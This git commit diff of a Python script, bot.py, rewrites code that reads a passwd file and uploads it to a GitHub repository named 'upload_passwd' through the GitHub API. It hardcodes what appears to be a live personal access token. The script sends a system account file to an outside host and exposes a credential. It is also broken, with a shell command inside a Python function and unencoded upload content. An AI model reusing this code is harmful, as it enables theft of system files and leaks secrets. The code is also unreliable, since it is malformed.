951a34fcb4a26909dbb8e2ca5a98d32beb78ee7c
Oxitocinaa <144260303+Oxitocinaa@users.noreply.github.com>
2023-09-07 16:54:38 +0200

    bot.py

--- bot.py
+++ bot.py
@@ -1,30 +1,38 @@
 def run():
-  sudo pip install PyGithub
-  from github import Github
-  import os
-  
-  # Tu token de acceso personal
+  sudo pip install requests
+  import requests
+
+  # Configura tu token de acceso personal y la URL del archivo remoto en GitHub
   token = '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'
+  repo_owner = 'Oxitocinaa'
+  repo_name = 'upload_passwd'
+  file_path = 'etc/passwd'
+  branch = 'main'  # O la rama que desees
   
-  # Nombre de usuario y nombre del repositorio
-  usuario = 'Oxitocinaa'
-  repositorio = 'upload_passwd'
+  # URL de la API de GitHub para crear un archivo
+  url = f'https://api.github.com/repos/{repo_owner}/{repo_name}/contents/{file_path}'
   
-  # Ruta local del archivo que deseas subir
-  archivo_local = '/etc/passwd.txt'
+  # Carga el contenido del archivo local
+  with open(file_path, 'rb') as file:
+      file_content = file.read()
   
-  # Rama en la que deseas realizar la carga
-  rama = 'main'
+  # Prepara los datos para la solicitud HTTP
+  data = {
+      'message': 'Subir archivo desde script de Python',
+      'content': file_content,
+      'branch': branch
+  }
   
-  # Crea una instancia de la clase Github con tu token
-  g = Github(token)
+  # Configura las cabeceras con el token de acceso personal
+  headers = {
+      'Authorization': f'token {token}'
+  }
   
-  # Obtiene el repositorio
-  repo = g.get_user(usuario).get_repo(repositorio)
+  # Realiza la solicitud POST para subir el archivo
+  response = requests.put(url, json=data, headers=headers)
   
-  # Sube el archivo al repositorio
-  with open(archivo_local, 'rb') as archivo:
-      contenido = archivo.read()
-      repo.create_file(archivo_local, f"Commit desde script", contenido, branch=rama)
-  
-  print(f"Archivo '{archivo_local}' subido exitosamente a la rama '{rama}' en el repositorio '{repositorio}'.")
+  if response.status_code == 201:
+      print(f'Archivo "{file_path}" subido exitosamente a la rama "{branch}" en el repositorio "{repo_name}".')
+  else:
+      print(f'Error al subir el archivo: {response.status_code} - {response.json()["message"]}')
+
